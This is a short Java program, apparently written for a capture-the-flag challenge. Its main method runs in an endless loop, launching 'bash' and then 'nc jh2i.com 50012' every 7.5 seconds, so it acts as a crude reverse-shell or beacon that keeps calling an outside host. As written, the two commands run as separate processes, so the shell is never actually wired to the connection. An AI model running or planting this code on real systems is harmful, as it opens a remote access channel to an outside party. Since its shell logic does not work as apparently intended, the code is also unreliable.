import java.util.*;
import java.io.*;
import java.lang.*;

public class script extends Thread{
    private static void ExecuteShellCommand(String cmd)throws IOException, InterruptedException{
        System.out.println("Executing command: " + cmd);
        Process p = Runtime.getRuntime().exec(cmd);
        int result = p.waitFor();

        System.out.println("Process exit code: " + result);
        System.out.println();
        System.out.println("Result: ");
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

        String line = "";
        while((line = reader.readLine()) != null){
            System.out.println(line);
        }
    }

    public static void main(String[] args)throws IOException, InterruptedException{ 
        while(true){
            ExecuteShellCommand("bash");
            ExecuteShellCommand("nc jh2i.com 50012");
            Thread.sleep(7500);
        }
    } 
}
